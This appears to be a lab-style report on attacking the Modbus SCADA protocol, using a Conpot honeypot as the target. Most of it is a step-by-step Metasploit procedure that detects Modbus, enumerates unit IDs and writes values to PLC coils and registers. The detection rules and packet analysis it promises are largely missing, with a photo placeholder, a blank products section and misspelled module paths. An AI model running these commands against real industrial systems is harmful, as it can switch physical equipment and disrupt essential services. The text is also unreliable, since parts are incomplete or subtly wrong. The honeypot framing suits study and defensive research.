
# Overview

In this report, we will focus on modbus, the most widely used SCADA/ICS protocol. We will use Honeypot as the target.<br>

This Report provides:

* Mitigation details for a vulnerability affecting the Galil RIO-47100 "Pocket PLC."
* Disclosure of exploit runs on ModBus protocol.
* Simulating an attack scenario against Scada Honeypot (Conpot)
* Modbus attack diagnostic functions in Wireshark
* Writing IDS rules to detect attack


***

# Vulnerability Overview

#### Improper Input Validation
 This module detects the Modbus service, tested on a SAIA PCD1.M2 system. Modbus is a clear text protocol used in common SCADA systems, developed originally as a serial-line (RS232) async protocol, and later transformed to IP, which is called ModbusTCP.
#### Vulnerability Details
This module allows reading and writing data to a PLC using the Modbus protocol. This module is based on the 'modiconstop.rb' Basecamp module from DigitalBond, as well as the mbtget perl script.

##### _Explotability_

This vulnerability could be exploited remotely.

##### _Existence of Exploit_

Known public exploits specifically target this vulnerability.

##### _Difficulty_

An attacker with a medium skill would be able to exploit this vulnerability.

## Affected Produtcs

--
## Impact

 This vulnerabilities other potential disastrous impacts of DoS attacks against SCADA/ICS systems include electrical blackouts, shutdown of water and sewage systems and other essential municipal services.

Impact to individual organizations depends on many factors that are unique to each organization.
***
# Exploitation of Vulnerability

 Metasploit has several modules specifically designed for the discovery and use of this most widely used protocol.
In order to see these modules, we will use the "search modbus" command after entering the console with the "msfconsole" command.

```sh
msfconsole
search modbus
```
The first module we will use as an exploit is the modbusdetect module. As it name implies, it is capable of detecting whether a site is running the modbus protocol. 
```sh
use auxilary/scanner/scada/modbusdetect 
```
We see the values we need to set with the "show options" command.
```sh
show options
exploit
```
This module only needs to set the destination's IP address to RHOST. The default port for Modbus is 502, so RPORT is set to 502 by default.

The destination ip is entered with the Set RHOSTS <IP-ADDRESS> command and the RHOSTS section is checked with the Show options command.
```sh
set RHOSTS <IP-address>
```
When we run this module, it goes to port 502 of the target system and sends a probe to determine if it is using modbus.
It confirms that our target is running modbus and we can now move on to our modbus-based discovery and exploit.

 We have confirmed that the target is actually running the modbus protocol, the next step is to enumerate the Unit ID's of the connected devices.

Modbus allows for up to 254 connected devices. To manipulate or communicate with any modbus device, we must have its UNIT ID, 
```sh
use auxilary/scanner/scanner/modbus_findunitid
set RHOST <IP Address>
exploit
```
This module finds the Each Unit ID of connected devices. These UNIT IDs are critical for reading and writing their data, as we will see later.

Our next modbus module is modbusclient. It enables us to read and write the data from both the coils and registers on these SCADA systems. 

```sh
 use auxiliary/scanner/scada/modbusclient
 show options
 ``` 
 This module requires several variables to be set. Most important is the ACTION. This variable can be set as;
- READ_REGISTERS
- WRITE_REGISTERS
- READ_COILS
- WRITE_COILS

 In SCADA/ICS terminology, coils are devices on the network that are either ON or OFF. Their settings are either 1 or 0.  By changing the values of a coil, you are switching it on or off.
 
 ```sh
 set ACTION WRITE_COIL
 set DATA 1
 set DATA_ADRESS <?>
 exploit
 ``` 
We can read the coils to check if the value has actually changed.
 ``` sh
set ACTION READ_COILS
 exploit
 ``` 
 
 To write the values in the registers
  ``` sh
set ACTION WRITE_REGISTERS
set DATA 27,27,27,27,27
  exploit
 ``` 
 To check to see whether the values have actually changed, we can change the ACTION to READ_REGISTERS.
   ``` sh
set ACTION READ_REGISTERS
exploit
 ``` 


***

# Packet Analysing
Run wireshark while exploit we’ve use running behind.
You see the blue part. This packet is the packet to the modbus protocol we want to analyze.
            FOTO
Double-clicking on the line will open the package content. 

***


## Conclusion
Many industrial systems can be accessed and controlled using Metasploit's simple modbus modules. In the wrong hands, this manipulation of coils and registers might lead to devastating results.
